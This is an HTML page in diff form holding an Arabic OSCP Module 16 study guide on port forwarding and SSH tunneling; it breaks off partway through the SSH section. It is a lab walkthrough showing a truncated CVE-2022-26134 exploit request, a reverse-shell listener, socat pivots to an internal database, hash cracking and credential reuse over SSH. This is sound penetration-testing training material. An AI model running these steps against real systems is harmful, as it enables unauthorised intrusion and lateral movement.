@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 16: إعادة توجيه البورتات والـ SSH Tunneling</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0:#0B0B0D;--bg-1:#121214;--surface:#17171A;--surface-2:#1D1D21;
+    --border:#2A2A2F;--border-soft:#232326;
+    --text:#E6E6E9;--text-soft:#C4C4CA;--muted:#8A8A92;
+    --red:#E1362F;--red-soft:rgba(225,54,47,0.10);--red-border:rgba(225,54,47,0.35);
+    --red-grad:linear-gradient(90deg,#E1362F,#F2794A);
+    --amber:#E8A23A;--amber-soft:rgba(232,162,58,0.09);--amber-border:rgba(232,162,58,0.30);
+    --green:#3FBF6E;--green-soft:rgba(63,191,110,0.09);--green-border:rgba(63,191,110,0.30);
+    --blue:#4EA1D3;--blue-soft:rgba(78,161,211,0.09);--blue-border:rgba(78,161,211,0.30);
+    --purple:#A179E8;--purple-soft:rgba(161,121,232,0.10);--purple-border:rgba(161,121,232,0.32);
+    --mono:'IBM Plex Mono','Courier New',monospace;
+  }
+  html[data-theme="light"]{--bg-0:#F4F3F1;--bg-1:#ECEBE8;--surface:#FFFFFF;--surface-2:#F3F2EF;--border:#DEDCD6;--border-soft:#E6E4DF;--text:#1C1B19;--text-soft:#3C3A36;--muted:#726F68;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;direction:rtl;text-align:right;background:var(--bg-0);}
+  body{font-family:'Cairo','Segoe UI',Tahoma,sans-serif;line-height:1.95;font-size:16.5px;color:var(--text);
+    background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,0.10),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,0.06),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);
+    background-attachment:fixed;transition:background .2s,color .2s;}
+  html[data-theme="light"] body{background:radial-gradient(900px 420px at 12% -8%,rgba(225,54,47,.06),transparent 60%),radial-gradient(800px 420px at 90% 6%,rgba(232,162,58,.05),transparent 60%),linear-gradient(180deg,var(--bg-0) 0%,var(--bg-1) 100%);}
+  .progress-rail{position:fixed;top:0;inset-inline:0;height:3px;background:rgba(255,255,255,.04);z-index:60;}
+  html[data-theme="light"] .progress-rail{background:rgba(0,0,0,.05);}
+  .progress-bar{height:100%;width:0%;background:var(--red-grad);transition:width .08s linear;}
+  .float-controls{position:fixed;bottom:22px;left:22px;z-index:55;display:flex;flex-direction:column;gap:10px;}
+  .fctrl-btn{width:42px;height:42px;border-radius:50%;background:var(--surface);border:1px solid var(--border);color:var(--text-soft);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:16px;box-shadow:0 10px 24px -10px rgba(0,0,0,.5);transition:transform .15s,border-color .15s,opacity .2s;}
+  .fctrl-btn:hover{transform:translateY(-2px);border-color:var(--red-border);color:var(--red);}
+  #toTop{opacity:0;pointer-events:none;}#toTop.show{opacity:1;pointer-events:auto;}
+  .page{max-width:860px;margin:0 auto;padding:46px 22px 100px;}
+  .banner{position:relative;overflow:hidden;background:linear-gradient(155deg,var(--surface) 0%,var(--bg-1) 55%,var(--surface) 100%);border:1px solid var(--border-soft);border-radius:10px;padding:0 0 34px;margin-bottom:26px;box-shadow:0 20px 50px -20px rgba(0,0,0,.6);}
+  .term-bar{display:flex;align-items:center;gap:8px;padding:13px 18px;border-bottom:1px solid var(--border-soft);background:rgba(255,255,255,.015);direction:ltr;}
+  .term-dot{width:11px;height:11px;border-radius:50%;display:inline-block;}
+  .term-dot.r{background:#E1362F;}.term-dot.y{background:#E8A23A;}.term-dot.g{background:#3FBF6E;}
+  .term-path{margin-inline-start:12px;font-family:var(--mono);font-size:12px;color:var(--muted);}
+  .theme-switch{margin-inline-start:auto;font-family:var(--mono);font-size:11px;color:var(--muted);background:transparent;border:1px solid var(--border);border-radius:4px;padding:4px 9px;cursor:pointer;}
+  .theme-switch:hover{color:var(--amber);border-color:var(--amber-border);}
+  .banner-body{padding:30px 34px 4px;}
+  .banner .kicker{display:inline-block;font-family:var(--mono);font-size:12.5px;letter-spacing:.03em;color:var(--red);background:var(--red-soft);border:1px solid var(--red-border);border-radius:3px;padding:5px 12px;margin-bottom:20px;direction:ltr;}
+  .banner h1{margin:0 0 14px;font-size:27px;font-weight:800;line-height:1.5;color:var(--text);}
+  .banner .lede{color:var(--muted);font-size:15.5px;line-height:1.95;max-width:640px;margin:0 0 24px;}
+  .tags{display:flex;flex-wrap:wrap;gap:9px;}
+  .tag{font-size:12.5px;font-family:var(--mono);color:var(--amber);background:var(--amber-soft);border:1px solid var(--amber-border);border-radius:3px;padding:5px 11px;}
+  .toc{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:6px 0;margin-bottom:50px;overflow:hidden;}
+  .toc-title{font-family:var(--mono);font-weight:600;font-size:13px;color:var(--green);padding:14px 22px;border-bottom:1px solid var(--border-soft);direction:ltr;text-align:left;}
+  .toc-list{display:flex;flex-direction:column;}
+  .toc-item{display:flex;align-items:center;gap:14px;padding:12px 22px;color:var(--text-soft);text-decoration:none;font-size:14.5px;border-bottom:1px solid rgba(255,255,255,.03);transition:background .15s;}
+  .toc-list .toc-item:last-child{border-bottom:none;}
+  .toc-item:hover{background:var(--red-soft);}
+  .toc-num{flex:none;font-family:var(--mono);font-size:12.5px;font-weight:600;color:#0F0F10;background:var(--red-grad);border-radius:3px;padding:3px 8px;direction:ltr;}
+  h1,h2,h3,h4{font-weight:700;}
+  h2{display:flex;align-items:center;gap:14px;font-size:21px;margin:66px 0 22px;padding-bottom:16px;border-bottom:1px solid var(--border-soft);color:var(--text);}
+  h2 .num{flex:none;font-family:var(--mono);font-size:13px;font-weight:700;color:#0F0F10;background:var(--red-grad);border-radius:5px;padding:7px 12px;direction:ltr;}
+  h2 .htext{line-height:1.5;}
+  h3{font-size:17px;margin:34px 0 14px;color:var(--red);display:flex;align-items:center;gap:9px;}
+  h3::before{content:"#";font-family:var(--mono);color:var(--amber);font-weight:700;}
+  h4{font-size:14.8px;margin:22px 0 10px;color:var(--text-soft);font-family:var(--mono);}
+  p{margin:0 0 17px;color:var(--text);}
+  strong{color:var(--text);font-weight:700;}
+  :root:not([data-theme="light"]) strong{color:#FBFBFC;}
+  a{color:var(--amber);text-decoration:none;border-bottom:1px dashed var(--amber-border);}
+  hr{border:none;height:1px;margin:50px 0;background:linear-gradient(90deg,transparent,var(--border),transparent);}
+  ul,ol{margin:0 0 18px;padding-inline-start:24px;}
+  li{margin-bottom:9px;color:var(--text);}
+  li::marker{color:var(--red);font-family:var(--mono);}
+  li>ul,li>ol{margin-top:9px;}
+  .goals-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;margin:0 0 22px;}
+  .goal-card{display:flex;gap:10px;align-items:flex-start;background:var(--surface);border:1px solid var(--border-soft);border-radius:7px;padding:13px 15px;font-size:14px;color:var(--text-soft);}
+  .goal-card .gi{flex:none;font-family:var(--mono);font-size:11px;font-weight:700;color:var(--green);background:var(--green-soft);border:1px solid var(--green-border);border-radius:4px;width:22px;height:22px;display:flex;align-items:center;justify-content:center;}
+  blockquote{margin:24px 0;padding:17px 22px;background:var(--red-soft);border:1px solid var(--red-border);border-inline-start:3px solid var(--red);border-radius:6px;color:var(--text-soft);}
+  blockquote p{margin:0;color:inherit;line-height:1.85;}
+  blockquote p+p{margin-top:10px;}
+  blockquote strong{color:var(--text);}
+  .callout{margin:24px 0;padding:17px 22px 18px;border-radius:6px;border:1px solid var(--border-soft);border-inline-start:3px solid var(--border);background:var(--surface);}
+  .callout p{margin:0;color:var(--text-soft);line-height:1.85;}
+  .callout p+p{margin-top:10px;}
+  .callout-label{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:11.5px;font-weight:700;letter-spacing:.02em;text-transform:uppercase;margin-bottom:10px;direction:ltr;}
+  .callout.note{border-inline-start-color:var(--blue);background:var(--blue-soft);}.callout.note .callout-label{color:var(--blue);}
+  .callout.warning{border-inline-start-color:var(--red);background:var(--red-soft);}.callout.warning .callout-label{color:var(--red);}
+  .callout.tip{border-inline-start-color:var(--green);background:var(--green-soft);}.callout.tip .callout-label{color:var(--green);}
+  .callout.examtip{border-inline-start-color:var(--purple);background:var(--purple-soft);}.callout.examtip .callout-label{color:var(--purple);}
+  .callout.case{border-inline-start-color:var(--amber);background:var(--amber-soft);}.callout.case .callout-label{color:var(--amber);}
+  .callout.definition{border-inline-start-color:var(--muted);background:var(--surface-2);}.callout.definition .callout-label{color:var(--text-soft);}
+  .table-wrap{overflow-x:auto;margin:22px 0;border:1px solid var(--border-soft);border-radius:8px;}
+  table{width:100%;border-collapse:collapse;font-size:14.2px;min-width:480px;}
+  thead th{background:var(--surface-2);color:var(--amber);font-weight:700;font-family:var(--mono);font-size:12.5px;text-transform:uppercase;letter-spacing:.02em;text-align:start;padding:13px 15px;border-bottom:1px solid var(--border-soft);white-space:nowrap;}
+  tbody td{padding:12px 15px;border-bottom:1px solid var(--border-soft);color:var(--text-soft);vertical-align:top;}
+  tbody tr:last-child td{border-bottom:none;}
+  tbody tr:nth-child(even){background:rgba(127,127,127,.03);}
+  tbody tr:hover{background:var(--red-soft);}
+  code{font-family:var(--mono);font-size:13.3px;background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:2px 6px;direction:ltr;unicode-bidi:embed;color:var(--green);}
+  .code-wrap{position:relative;overflow-x:auto;margin:22px 0;}
+  .code-tag{position:absolute;top:10px;left:14px;font-family:var(--mono);font-size:10.5px;color:var(--muted);letter-spacing:.04em;text-transform:uppercase;z-index:2;}
+  .copy-btn{position:absolute;top:8px;right:10px;z-index:2;font-family:var(--mono);font-size:11px;color:var(--muted);background:var(--surface-2);border:1px solid var(--border-soft);border-radius:4px;padding:4px 9px;cursor:pointer;direction:ltr;}
+  .copy-btn:hover{color:var(--amber);border-color:var(--amber-border);}
+  .copy-btn.copied{color:var(--green);border-color:var(--green-border);}
+  pre{background:var(--bg-0);border:1px solid var(--border-soft);border-inline-start:3px solid var(--red);border-radius:8px;padding:30px 22px 18px;direction:ltr;text-align:left;margin:0;}
+  html[data-theme="light"] pre{background:#16181C;}
+  pre code{background:none;border:none;padding:0;color:#B9E8C9;font-size:13.2px;line-height:1.75;}
+  /* network flow diagrams */
+  .diagram-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:10px;padding:22px 18px 16px;margin:24px 0;}
+  .diagram-card svg{width:100%;height:auto;display:block;}
+  .diagram-caption{margin-top:10px;text-align:center;font-family:var(--mono);font-size:11.5px;color:var(--muted);}
+  .takeaways{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:18px 22px 20px;margin:30px 0 10px;}
+  .takeaways-title{font-family:var(--mono);font-size:12.5px;font-weight:700;color:var(--green);margin-bottom:12px;direction:ltr;text-align:left;display:flex;align-items:center;gap:8px;}
+  .takeaways ul{margin:0;padding-inline-start:20px;}
+  .takeaways li{color:var(--text-soft);font-size:14.5px;}
+  .cheat-section h4{color:var(--amber);font-size:13px;margin:26px 0 8px;}
+  .step-track{display:flex;flex-direction:column;gap:0;margin:24px 0;}
+  .step-item{position:relative;padding:0 0 26px 0;padding-inline-start:46px;border-inline-start:2px solid var(--border-soft);}
+  .step-item:last-child{border-inline-start:2px solid transparent;padding-bottom:4px;}
+  .step-num{position:absolute;inset-inline-start:-17px;top:0;width:32px;height:32px;border-radius:50%;background:var(--red-grad);color:#0F0F10;font-family:var(--mono);font-weight:700;font-size:13px;display:flex;align-items:center;justify-content:center;}
+  .step-title{font-weight:700;color:var(--text);margin-bottom:6px;font-size:15px;}
+  .step-body{color:var(--text-soft);font-size:14.5px;}
+  .step-body p{margin:0 0 10px;}.step-body p:last-child{margin-bottom:0;}
+  /* flow arrow visual */
+  .flow-vis{background:var(--surface-2);border:1px solid var(--border-soft);border-radius:8px;padding:14px 20px;margin:18px 0;direction:ltr;text-align:left;overflow-x:auto;}
+  .flow-row{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:12.5px;margin-bottom:8px;white-space:nowrap;}
+  .flow-row:last-child{margin-bottom:0;}
+  .fn{background:var(--surface);border:1px solid var(--border-soft);border-radius:5px;padding:5px 10px;color:var(--amber);font-weight:600;}
+  .fn.attacker{border-color:var(--red-border);color:var(--red);}
+  .fn.target{border-color:var(--green-border);color:var(--green);}
+  .fn.pivot{border-color:var(--blue-border);color:var(--blue);}
+  .fa{color:var(--muted);font-size:14px;}
+  .fl{color:var(--muted);font-size:11px;}
+  /* compare grid */
+  .compare-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin:22px 0;}
+  @media(max-width:620px){.compare-grid{grid-template-columns:1fr;}}
+  .cmp-card{background:var(--surface);border:1px solid var(--border-soft);border-radius:8px;padding:16px 18px;}
+  .cmp-title{font-family:var(--mono);font-size:12px;font-weight:700;letter-spacing:.03em;text-transform:uppercase;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border-soft);}
+  .cmp-card.red .cmp-title{color:var(--red);}
+  .cmp-card.blue .cmp-title{color:var(--blue);}
+  .cmp-card.green .cmp-title{color:var(--green);}
+  .cmp-card.amber .cmp-title{color:var(--amber);}
+  .cmp-card ul{margin:0;padding-inline-start:18px;}
+  .cmp-card li{font-size:13.5px;color:var(--text-soft);margin-bottom:7px;}
+  .footer-note{margin-top:70px;padding-top:26px;border-top:1px solid var(--border-soft);color:var(--muted);font-size:13.3px;font-family:var(--mono);text-align:center;direction:ltr;}
+  @media print{.float-controls,.progress-rail,.copy-btn,.theme-switch{display:none!important;}body{background:#fff;color:#000;}.page{max-width:100%;}}
+  @media(max-width:640px){.page{padding:28px 14px 70px;}.banner-body{padding:24px 20px 4px;}.banner h1{font-size:21px;}h2{font-size:18px;gap:10px;}.float-controls{left:12px;bottom:14px;}}
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق" aria-label="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+  <div class="banner">
+    <div class="term-bar">
+      <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+      <span class="term-path">root@oscp:~/module-16$</span>
+      <button class="theme-switch" id="themeSwitch">theme: dark</button>
+    </div>
+    <div class="banner-body">
+      <span class="kicker">OSCP · PEN-200 · Module 16</span>
+      <h1>إعادة توجيه البورتات والـ SSH Tunneling</h1>
+      <p class="lede">إزاي تتجاوز تقسيم الشبكة (network segmentation) والـ firewalls عشان توصل لخوادم داخلية — من Socat وSocat pivoting، لحد SSH -L/-D/-R والـ Remote Dynamic، وsshuttle، وأدوات Windows الأصيلة (OpenSSH، Plink، Netsh portproxy).</p>
+      <div class="tags">
+        <span class="tag">socat</span>
+        <span class="tag">ssh-tunneling</span>
+        <span class="tag">socks-proxy</span>
+        <span class="tag">sshuttle</span>
+        <span class="tag">netsh-portproxy</span>
+        <span class="tag">plink</span>
+      </div>
+    </div>
+  </div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+<a class="toc-item" href="#lu1"><span class="toc-num">01</span><span class="toc-label">ليه هذه التقنيات مهمة — Network Segmentation</span></a>
+<a class="toc-item" href="#lu2"><span class="toc-num">02</span><span class="toc-label">Port Forwarding بـ Socat — CVE واستغلال CONFLUENCE</span></a>
+<a class="toc-item" href="#lu3"><span class="toc-num">03</span><span class="toc-label">SSH Tunneling — المقدمة والأنواع الثلاثة</span></a>
+<a class="toc-item" href="#lu4"><span class="toc-num">04</span><span class="toc-label">SSH -L (Local) · -D (Dynamic) · -R (Remote) · Remote Dynamic</span></a>
+<a class="toc-item" href="#lu5"><span class="toc-num">05</span><span class="toc-label">sshuttle — Tunneling شبيه بالـ VPN</span></a>
+<a class="toc-item" href="#lu6"><span class="toc-num">06</span><span class="toc-label">Port Forwarding بأدوات Windows</span></a>
+<a class="toc-item" href="#cheat"><span class="toc-num">--</span><span class="toc-label">Cheat Sheet مرجعي</span></a>
+<a class="toc-item" href="#summary"><span class="toc-num">--</span><span class="toc-label">الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<hr />
+
+<h2 id="lu1"><span class="num">01</span><span class="htext">ليه هذه التقنيات مهمة</span></h2>
+
+<h3>الشبكات الـ Flat مقابل المقسَّمة</h3>
+<div class="compare-grid">
+<div class="cmp-card red">
+  <div class="cmp-title">Flat Network (غير مقسَّمة)</div>
+  <ul>
+    <li>كل جهاز يتواصل بحرية مع الآخرين</li>
+    <li>جهاز واحد مخترَق → المهاجم يصل لكل شيء</li>
+    <li>تُتجنَّب في المؤسسات الآمنة — تُعتبَر خطرًا كبيرًا</li>
+  </ul>
+</div>
+<div class="cmp-card green">
+  <div class="cmp-title">Segmented Network (مقسَّمة)</div>
+  <ul>
+    <li>الشبكة مقسَّمة لمناطق معزولة (subnets / VLANs)</li>
+    <li>كل منطقة تحتوي أنظمة بوظيفة أو مستوى ثقة مماثل</li>
+    <li>التواصل بين المناطق مُتحكَّم فيه وفلتَر بصرامة</li>
+  </ul>
+</div>
+</div>
+
+<h3>مناطق الشبكة الشائعة</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>المنطقة</th><th>الوصف</th><th>إمكانية الوصول</th></tr></thead>
+<tbody>
+<tr><td><strong>WAN</strong></td><td>الإنترنت أو backbone مؤسسي كبير — حيث يعيش جهاز المهاجم</td><td>متاح للجميع</td></tr>
+<tr><td><strong>DMZ</strong></td><td>منطقة شبه موثوقة — تستضيف سيرفرات عامة (ويب، بريد، DNS). معزولة عن الـ LAN الداخلي لتقليل تأثير الاختراق</td><td>محدود من WAN</td></tr>
+<tr><td><strong>Internal LAN</strong></td><td>منطقة مقيَّدة للغاية — قواعد بيانات، domain controllers، سيرفرات حساسة. غير قابلة للوصول من WAN أو DMZ بدون قواعد صريحة</td><td>من DMZ فقط بقواعد</td></tr>
+</tbody>
+</table></div>
+
+<h3>ضوابط أمان تمنع الوصول المباشر</h3>
+<ul>
+<li><strong>Firewalls:</strong> بتفلتر الترافيك بناءً على IPs وأرقام بورتات — سوفت وير (host-based) أو هاردوير (perimeter/next-gen)</li>
+<li><strong>Deep Packet Inspection (DPI):</strong> بتفحص محتوى الحزم — ليس فقط الـ headers</li>
+<li><strong>NAC وIDS/IPS:</strong> بتكشف أنماطًا مشبوهة حتى على البورتات المسموحة وتحجب السلوك الشاذ</li>
+</ul>
+
+<h3>Port Forwarding مقابل Tunneling</h3>
+<div class="compare-grid">
+<div class="cmp-card blue">
+  <div class="cmp-title">Port Forwarding (إعادة توجيه)</div>
+  <ul>
+    <li>جهاز بيستمع على بورت ويُعيد توجيه الترافيك لـ address:port آخر</li>
+    <li>بيجعل خدمة غير قابلة للوصول تظهر مباشرة من الخارج</li>
+    <li>فكّر فيها كـ: امتداد هاتف يُرنّ في غرفة أخرى</li>
+  </ul>
+</div>
+<div class="cmp-card amber">
+  <div class="cmp-title">Tunneling</div>
+  <ul>
+    <li>بتلفّ بروتوكول داخل بروتوكول آخر للمرور خلال الفلاتر خفيةً</li>
+    <li>مثال: ترافيك قاعدة بيانات مخفي داخل SSH مشفَّر</li>
+    <li>فكّر فيها كـ: رسالة داخل ظرف آخر</li>
+  </ul>
+</div>
+</div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu1_takeaways.txt</div>
+<ul>
+<li>الشبكات المقسَّمة هي القاعدة في المؤسسات الحديثة — التوقّع إن لكل pivot جهاز في منطقة مختلفة</li>
+<li>Port Forwarding = وصول لخدمة واحدة محددة | Tunneling = إخفاء الترافيك داخل بروتوكول آخر</li>
+<li>DPI وIDS/IPS الحديثة بتبحث جوّه الحزم — التشفير عبر SSH أقل قابلية للكشف</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="lu2"><span class="num">02</span><span class="htext">Port Forwarding بـ Socat — CVE واستغلال Confluence</span></h2>
+
+<h3>نظرة عامة على سيناريو اللاب</h3>
+<div class="callout case">
+<div class="callout-label">✎ الإعداد</div>
+<p><strong>ما لدينا:</strong> CONFLUENCE01 — سيرفر ويب مخترَق، قدم في WAN وقدم في DMZ | PGDATABASE01 — سيرفر PostgreSQL داخلي، قابل للوصول فقط من DMZ | Kali — في WAN، يمكنها الوصول لـ CONFLUENCE01 مباشرة</p>
+<p><strong>المشكلة:</strong> Kali لا تستطيع الوصول لـ PGDATABASE01 مباشرةً — تقسيم الشبكة يمنعها</p>
+<p><strong>الهدف:</strong> استخدام CONFLUENCE01 كـ pivot لتمرير الترافيك للـ DMZ</p>
+</div>
+
+<div class="diagram-card">
+<svg viewBox="0 0 760 130" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <marker id="a16" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#E8A23A"/></marker>
+    <marker id="a16r" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#E1362F"/></marker>
+    <marker id="a16b" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="#4EA1D3"/></marker>
+  </defs>
+  <g font-family="IBM Plex Mono, monospace" font-size="11" fill="#C4C4CA">
+    <!-- Zone labels -->
+    <text x="90" y="18" text-anchor="middle" fill="#8A8A92" font-size="10">WAN</text>
+    <text x="360" y="18" text-anchor="middle" fill="#8A8A92" font-size="10">DMZ</text>
+    <text x="640" y="18" text-anchor="middle" fill="#8A8A92" font-size="10">Internal LAN</text>
+    <!-- Dividers -->
+    <line x1="230" y1="10" x2="230" y2="125" stroke="#2A2A2F" stroke-dasharray="4,3"/>
+    <line x1="510" y1="10" x2="510" y2="125" stroke="#2A2A2F" stroke-dasharray="4,3"/>
+    <!-- Nodes -->
+    <rect x="20" y="45" width="140" height="50" rx="7" fill="#17171A" stroke="#E1362F" stroke-width="1.5"/>
+    <text x="90" y="68" text-anchor="middle" fill="#E1362F" font-weight="700">Kali</text>
+    <text x="90" y="85" text-anchor="middle" font-size="10">192.168.50.x</text>
+    <rect x="275" y="45" width="160" height="50" rx="7" fill="#17171A" stroke="#4EA1D3" stroke-width="1.5"/>
+    <text x="355" y="68" text-anchor="middle" fill="#4EA1D3" font-weight="700">CONFLUENCE01</text>
+    <text x="355" y="85" text-anchor="middle" font-size="10">192.168.50.63 / 10.4.50.x</text>
+    <rect x="560" y="45" width="170" height="50" rx="7" fill="#17171A" stroke="#3FBF6E" stroke-width="1.5"/>
+    <text x="645" y="68" text-anchor="middle" fill="#3FBF6E" font-weight="700">PGDATABASE01</text>
+    <text x="645" y="85" text-anchor="middle" font-size="10">10.4.50.215 (not reachable)</text>
+    <!-- Arrows -->
+    <path d="M160 70 H275" stroke="#E8A23A" stroke-width="2" marker-end="url(#a16)"/>
+    <path d="M435 70 H560" stroke="#E8A23A" stroke-width="2" marker-end="url(#a16)"/>
+    <path d="M160 80 Q215 120 218 120" stroke="#E1362F" stroke-width="1.5" stroke-dasharray="4,3" fill="none"/>
+    <text x="185" y="118" font-size="10" fill="#E1362F">مباشر ✗</text>
+  </g>
+</svg>
+<div class="diagram-caption">Kali → CONFLUENCE01 (WAN+DMZ) → PGDATABASE01 — الوصول المباشر محجوب بتقسيم الشبكة</div>
+</div>
+
+<h3>الحصول على Shell — CVE-2022-26134</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ الثغرة</div>
+<p>RCE حرج في Atlassian Confluence — بدون حاجة للتوثيق. يستغل OGNL injection في محرك معالجة التعبيرات. يسمح بتنفيذ كود Java عشوائي على السيرفر.</p>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># طلب HTTP مصاغ يستغل OGNL injection
+curl -v http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29...
+
+# Netcat listener على Kali لاستقبال الـ reverse shell
+nc -lvnp 4444
+# Shell يصل — صلاحيات محدودة لكن كافية للبدء
+</code></pre></div>
+
+<h3>Enumeration بعد الاستغلال على CONFLUENCE01</h3>
+<ol>
+<li><strong>فحص واجهات الشبكة:</strong> يكشف إن الجهاز يمتلك <strong>واجهتَين</strong> — WAN وDMZ. جدول التوجيه يؤكد إمكانية التواصل مع الشبكتين.</li>
+<li><strong>صيد بيانات الاعتماد:</strong> فحص ملفات إعداد التطبيق — Confluence بتخزّن بيانات الاعتماد في XML. نجد: IP لـ PGDATABASE01، اسم قاعدة البيانات، اسم المستخدم، والباسورد بنص واضح.</li>
+<li><strong>تحديد العائق:</strong> لا يوجد psql client مثبَّت على CONFLUENCE01. Shell منخفض الصلاحيات لا يستطيع تثبيت حزم. <strong>الحل:</strong> port forward عبر CONFLUENCE01 حتى تتصل Kali مباشرةً.</li>
+</ol>
+
+<h3>ما هو Socat</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ Definition</div>
+<p><strong>Socat = SOcket CAT</strong> — نسخة متقدمة من Netcat. يعمل كليًا في user space — لا يحتاج root للبورتات غير المميَّزة. يدعم TCP، UDP، Unix sockets، SSL/TLS والمزيد. على عكس iptables، يعمل بدون تعديل قواعد الـ firewall.</p>
+</div>
+<p>قدرات رئيسية للـ pivoting: تمرير البورتات بين عناوين شبكة مختلفة، ترحيل الترافيك بين أنواع sockets مختلفة، معالجة اتصالات متعددة عبر <code>fork</code>.</p>
+
+<h3>Socat Port Forward — تفصيل الأمر</h3>
+<div class="code-wrap"><span class="code-tag">bash — على CONFLUENCE01</span><pre><code>socat -ddd \
+  TCP-LISTEN:2345,fork \
+  TCP:10.4.50.215:5432
+
+# -ddd       = verbose debug output
+# TCP-LISTEN:2345 = استمع على بورت 2345
+# fork       = معالجة اتصالات متعددة
+# TCP:10.4.50.215:5432 = وجّه لـ PG01:5432
+</code></pre></div>
+
+<div class="flow-vis">
+  <div class="flow-row"><span class="fn attacker">Kali: psql -p 2345</span><span class="fa">→</span><span class="fn pivot">C01:2345 (Socat)</span><span class="fa">→</span><span class="fn target">PG01:5432 (PostgreSQL)</span></div>
+</div>
+
+<div class="code-wrap"><span class="code-tag">bash — من Kali</span><pre><code>psql -h 192.168.50.63 -p 2345 -U postgres
+# نتصل بـ PGDATABASE01 وكأننا متصلون مباشرةً!
+</code></pre></div>
+
+<h3>الانتقال لـ SSH عبر Socat</h3>
+<p>بعد كسر هاشات كلمات المرور من قاعدة البيانات، ممكن إعادة استخدام نفس بيانات الاعتماد على SSH في PGDATABASE01:</p>
+<div class="code-wrap"><span class="code-tag">bash</span><pre><code># كسر الهاشات بـ Hashcat
+hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
+
+# Forward جديد لـ SSH (بدل PostgreSQL)
+socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+
+# الاتصال عبر SSH من خلال النفق
+ssh database_admin@192.168.50.63 -p 2222
+# Shell على PGDATABASE01!
+</code></pre></div>
+
+<div class="takeaways">
+<div class="takeaways-title">$ cat ./lu2_takeaways.txt</div>
+<ul>
+<li>Socat = Netcat متقدم — يمكن استخدامه في user space بدون root</li>
+<li>الأمر الأساسي: <code>socat TCP-LISTEN:PORT,fork TCP:DEST_IP:DEST_PORT</code></li>
+<li>إعادة استخدام الباسورد (DB → SSH) = تصعيد pivot جديد بدون إكسبلويت إضافي</li>
+<li>يعمل مع أي بروتوكول TCP/UDP — ليس مقيَّدًا بـ SSH</li>
+</ul>
+</div>
+
+<hr />
+
+<h2 id="lu3"><span class="num">03</span><span class="htext">SSH Tunneling — المقدمة والأنواع الثلاثة</span></h2>
+
+<h3>ليه SSH مثالي للـ Tunneling</h3>
+<ul>
+<li>SSH صُمِّم للـ tunneling من البداية</li>
+<li>كل اتصال SSH ينشئ قناة مشفَّرة — الأوامر، الباسوردات، والبيانات كلها محمية</li>
+<li>يمكنه حمل تقريبًا أي نوع من ترافيك الشبكة داخل الغلاف المشفَّر</li>
+<li>مثبَّت مسبقًا على تقريبًا كل نظام Linux/Unix وWindows 10 1803+ افتراضيًا</li>
+</ul>
+
+<h3>الأنواع الثلاثة للـ SSH Tunneling</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>النوع</th><th>الـ Flag</th><th>الاتجاه</th><th>أفضل استخدام</th></tr></thead>
+<tbody>
+<tr><td><strong>Local Forwarding</strong></td><td><code>-L</code></td><td>جهازك → Pivot → داخلي</td><td>الوصول لخدمة داخلية محددة</td></tr>
+<tr><td><strong>Remote Forwarding</strong></td><td><code>-R</code></td><td>داخلي → Pivot → جهازك</td><td>تجاوز حجب الـ firewall للاتصالات الواردة</td></tr>
+<tr><td><strong>Dynamic Forwarding</strong></td><td><code>-D</code></td><td>SOCKS Proxy كامل (أي هدف)</td><td>فحص وتصفّح كامل الشبكة الداخلية</td></tr>
+</tbody>
+</table></div>
+
+<h3>متى تستخدم SSH بدل Socat</h3>
+<div class="compare-grid">
+<div class="cmp-card green">
+  <div class="cmp-title">استخدم SSH Tunneling</div>
+  <ul>
+    <li>عندك بيانات اعتماد SSH على جهاز الـ pivot</li>
+    <li>تحتاج تشفيرًا — الترافيك يجب ألا يكون مرئيًا لمراقبة الشبكة</li>
+    <li>لا تستطيع فتح بورتات جديدة للاستماع على الـ pivot</li>
+    <li>تريد الوصول لكثير من المضيفين الداخليين</li>
+    <li>لا تستطيع رفع أدوات خارجية — SSH موجود دائمًا</li>
+  </ul>
+</div>
